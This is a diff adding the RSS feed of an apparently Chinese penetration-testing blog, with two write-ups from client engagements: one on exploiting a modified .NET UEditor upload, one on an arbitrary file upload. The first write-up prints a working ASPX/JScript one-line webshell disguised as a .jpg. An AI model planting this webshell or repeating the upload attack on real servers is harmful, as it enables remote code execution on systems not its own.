@@ -1,0 +1,2482 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>渗透实战 on iceH&#39;s Blog</title>
+        <link>https://360rce.github.io/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</link>
+        <description>Recent content in 渗透实战 on iceH&#39;s Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！</copyright>
+        <lastBuildDate>Wed, 11 Dec 2019 09:19:25 +0000</lastBuildDate><atom:link href="https://360rce.github.io/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>佛学的魔改.net Ueditor</title>
+        <link>https://360rce.github.io/p/ym1ku8fe/</link>
+        <pubDate>Wed, 11 Dec 2019 09:19:25 +0000</pubDate>
+        
+        <guid>https://360rce.github.io/p/ym1ku8fe/</guid>
+        <description>&lt;img src="https://w.wallhaven.cc/full/jx/wallhaven-jxdvpp.png" alt="Featured image of post 佛学的魔改.net Ueditor" /&gt;&lt;p&gt;前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。&lt;/p&gt;
+&lt;p&gt;网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。&lt;/p&gt;
+&lt;p&gt;翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/01.jpg&#34;
+	width=&#34;1900&#34;
+	height=&#34;771&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/01_hudc845da5e9d520fc787f37c503f66ff3_92914_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/01_hudc845da5e9d520fc787f37c503f66ff3_92914_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;246&#34;
+		data-flex-basis=&#34;591px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;通过fd抓包获取到编辑器路径为：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;https://xxx.xxx.com.cn/crm9000/HtmlControl/ueditor1.4.3.3/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;果断用exp去打，结果访问漏洞地址的时候，发现404。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/02.jpg&#34;
+	width=&#34;998&#34;
+	height=&#34;327&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/02_hu0c29d803a40c547f4df5113b571d2af3_17044_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/02_hu0c29d803a40c547f4df5113b571d2af3_17044_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;305&#34;
+		data-flex-basis=&#34;732px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;查看上传功能，发现上传功能也无法正常使用，提示后端配置项无法正常加载。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/03.jpg&#34;
+	width=&#34;1784&#34;
+	height=&#34;666&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/03_hu6b94eb4904a07264c944bfce3acd8afe_93230_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/03_hu6b94eb4904a07264c944bfce3acd8afe_93230_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;267&#34;
+		data-flex-basis=&#34;642px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;查看配置文件，感觉也没有问题呀，此时有点郁闷。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/04.jpg&#34;
+	width=&#34;1191&#34;
+	height=&#34;575&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/04_hu8027819bf9a869d2ed5d00a9e68bf9ce_79605_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/04_hu8027819bf9a869d2ed5d00a9e68bf9ce_79605_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;207&#34;
+		data-flex-basis=&#34;497px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在牧马大佬的提示下，仔细查看js和流量。首先查看js，发现此处加载了一个Add.js文件。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/05.jpg&#34;
+	width=&#34;1300&#34;
+	height=&#34;507&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/05_hu4dda13b76e39b4fbae2a0bc915c1dacd_35601_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/05_hu4dda13b76e39b4fbae2a0bc915c1dacd_35601_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;256&#34;
+		data-flex-basis=&#34;615px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;打开这个js文件，找到了ueditor的真实路径。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/06.jpg&#34;
+	width=&#34;1478&#34;
+	height=&#34;568&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/06_hu49eac7373cd60b2c12702b1bd131db6f_90250_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/06_hu49eac7373cd60b2c12702b1bd131db6f_90250_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;260&#34;
+		data-flex-basis=&#34;624px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;但是去访问的时候，发现地址无法访问。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/07.jpg&#34;
+	width=&#34;985&#34;
+	height=&#34;721&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/07_hu6381e0b3bd98b6b274924acb259b18c8_17729_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/07_hu6381e0b3bd98b6b274924acb259b18c8_17729_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;136&#34;
+		data-flex-basis=&#34;327px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;通过查看加载编辑器时的网络包，可以看到这也是后端配置项无法正常加载的原因。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/08.jpg&#34;
+	width=&#34;1909&#34;
+	height=&#34;784&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/08_huc9d8e90050d1a8584532862197f417df_121149_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/08_huc9d8e90050d1a8584532862197f417df_121149_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;243&#34;
+		data-flex-basis=&#34;584px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后尝试直接拼接编辑器路径到域名上，发现访问成功，原来是开发配置得有问题，多加了端口。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/09.jpg&#34;
+	width=&#34;1012&#34;
+	height=&#34;225&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/09_hua6af383afdaedc76b8a3fe6704c7b7f8_7776_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/09_hua6af383afdaedc76b8a3fe6704c7b7f8_7776_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;449&#34;
+		data-flex-basis=&#34;1079px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;既然能够正常访问，那我就不客气了，拿exp干他，先在服务器上丢个aa.jpg的一句话马。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/10.jpg&#34;
+	width=&#34;648&#34;
+	height=&#34;197&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/10_hu60f42e808363990415a577c829ddd2e8_6448_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/10_hu60f42e808363990415a577c829ddd2e8_6448_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;328&#34;
+		data-flex-basis=&#34;789px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;上传成功，返回的路径为：&lt;code&gt;upload/image/201912/11/6371165485276351045218627.aspx&lt;/code&gt;（记住这个该死的路径，等下要懵逼。）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/11.jpg&#34;
+	width=&#34;1075&#34;
+	height=&#34;375&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/11_hu38e59862328b04bfeb253e7c24e2fe16_12775_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/11_hu38e59862328b04bfeb253e7c24e2fe16_12775_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;286&#34;
+		data-flex-basis=&#34;688px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;接下来就是寻找路径了，我tm找了半个多小时呀，拼接了各种路径，都没找到。。。&lt;/p&gt;
+&lt;p&gt;后来实在无奈，继续去查看配置文件，看到配置文件的时候，人是懵逼的，路径是对的呀，但感觉总有哪里不对劲。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/12.jpg&#34;
+	width=&#34;768&#34;
+	height=&#34;979&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/12_hud9f5abfcc3bd844df30f34e9839c1555_32129_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/12_hud9f5abfcc3bd844df30f34e9839c1555_32129_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;78&#34;
+		data-flex-basis=&#34;188px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后不信这个邪，又重新上传了一次，发现此时返回的路径是&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;upload/image/20191211/6371165520599596974371346.aspx&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/13.jpg&#34;
+	width=&#34;980&#34;
+	height=&#34;350&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/13_hu420f54368f5bff969300e3871c95c34b_12951_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/13_hu420f54368f5bff969300e3871c95c34b_12951_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;280&#34;
+		data-flex-basis=&#34;672px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;仔细一看，第一次返回的路径中多了&amp;rsquo;/&amp;rsquo;，感情是服务端返回了一个假路径给我，难怪配置文件看着哪里不对劲，原来是路径规则。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/14.jpg&#34;
+	width=&#34;668&#34;
+	height=&#34;61&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/14_hufc513a1060b63e5b4bb22e26607102ba_3521_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/14_hufc513a1060b63e5b4bb22e26607102ba_3521_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1095&#34;
+		data-flex-basis=&#34;2628px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;但是访问shell的时候，报了一个错，第一次遇到这种问题。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/15.jpg&#34;
+	width=&#34;969&#34;
+	height=&#34;397&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/15_hu136b7bef6cad7f1f66143dac2c80eee1_113342_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/15_hu136b7bef6cad7f1f66143dac2c80eee1_113342_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;244&#34;
+		data-flex-basis=&#34;585px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;直接在aa.jpg里面加上&lt;code&gt;&amp;lt;head runat=&amp;quot;server&amp;quot; /&amp;gt;&lt;/code&gt;，再上传，浏览器访问的时候就正常了，但是菜刀连接的时候，又报了这一堆东西（同事复现的时候，菜刀直接连接成功，佛学）。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;../../../../../../../App_Themes/default/default.css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;../../../../../../../App_Themes/green/EnStyle.css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;../../../../../../../App_Themes/green/Style.css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;继续把这些加到aa.jpg内容里，最后，aa.jpg内容为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;runat&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;server&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;../../../../../../../App_Themes/default/default.css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;../../../../../../../App_Themes/green/EnStyle.css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;../../../../../../../App_Themes/green/Style.css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;%@ Page Language=&amp;#34;Jscript&amp;#34;%&amp;gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;%eval(Request.Item[&amp;#34;g&amp;#34;],&amp;#34;unsafe&amp;#34;);%&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;上传成功后，菜刀连接成功。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/ym1ku8fe/16.jpg&#34;
+	width=&#34;784&#34;
+	height=&#34;534&#34;
+	srcset=&#34;https://360rce.github.io/p/ym1ku8fe/16_hud2ba2eb9b64e1ef6708b5692cf92864c_18732_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/ym1ku8fe/16_hud2ba2eb9b64e1ef6708b5692cf92864c_18732_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;佛学的魔改Ueditor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;146&#34;
+		data-flex-basis=&#34;352px&#34;
+	
+&gt;&lt;/p&gt;</description>
+        </item>
+        <item>
+        <title>记一次任意文件上传</title>
+        <link>https://360rce.github.io/p/iqi0ucr4/</link>
+        <pubDate>Wed, 27 Nov 2019 17:06:13 +0000</pubDate>
+        
+        <guid>https://360rce.github.io/p/iqi0ucr4/</guid>
+        <description>&lt;img src="https://w.wallhaven.cc/full/p9/wallhaven-p97q3p.jpg" alt="Featured image of post 记一次任意文件上传" /&gt;&lt;p&gt;很久没发文章了，一个是因为忙，另一个就是不知道发什么，这次遇到一个上传觉得挺有意思的，就分享一下思路。
+在客户现场驻场遇到的站点，我们乙方在挖洞的同时，甲方也有十多个人在同步挖洞。我们少挖到洞还要找我们麻烦，欲哭无泪，太难了。
+当时通过另外一个漏洞getshell，还在暗自高兴的时候，翻目录的时候，看到一个TempFile的目录下有个名为shell.aspx的文件，文件上传时间在目标给我们的前几个小时（客户在给我们目标前，就让甲方的渗透人员先测试了），此时的我笑容逐渐消失，意识到问题的严重性。&lt;/p&gt;
+&lt;p&gt;看到TempFile的目录，猜测是通过上传功能上传上来的。然后在后台找了许久，还好功能不多，找到了上传的功能点（之前这个功能点因为浏览器不兼容的原因，无法使用，后来使用ie才能够正常使用）。&lt;/p&gt;
+&lt;p&gt;上传点在一个上传附件的地方，上传图片，拦截到此数据包发送到repeater模块。
+&lt;img src=&#34;https://360rce.github.io/p/iqi0ucr4/1.png&#34;
+	width=&#34;1414&#34;
+	height=&#34;679&#34;
+	srcset=&#34;https://360rce.github.io/p/iqi0ucr4/1_hu48c69d74ea69ed4c1b5e436ec1798d01_112407_480x0_resize_box_3.png 480w, https://360rce.github.io/p/iqi0ucr4/1_hu48c69d74ea69ed4c1b5e436ec1798d01_112407_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;20191127记一次任意文件上传&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;208&#34;
+		data-flex-basis=&#34;499px&#34;
+	
+&gt;
+修改数据包，可以发现上传成功，但是并不知道真实路径，文件的访问路径为：&lt;a class=&#34;link&#34; href=&#34;http://xxx.com:port/File/DownLoadFile/22c84d83-d9cf-dd7b-0dd1-ea72ddddd18b&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://xxx.com:port/File/DownLoadFile/22c84d83-d9cf-dd7b-0dd1-ea72ddddd18b&lt;/a&gt;。
+&lt;img src=&#34;https://360rce.github.io/p/iqi0ucr4/2.png&#34;
+	width=&#34;1235&#34;
+	height=&#34;657&#34;
+	srcset=&#34;https://360rce.github.io/p/iqi0ucr4/2_hu1c7718fa1b9ebca11dd995cee414bdc1_92478_480x0_resize_box_3.png 480w, https://360rce.github.io/p/iqi0ucr4/2_hu1c7718fa1b9ebca11dd995cee414bdc1_92478_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;20191127记一次任意文件上传&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;187&#34;
+		data-flex-basis=&#34;451px&#34;
+	
+&gt;
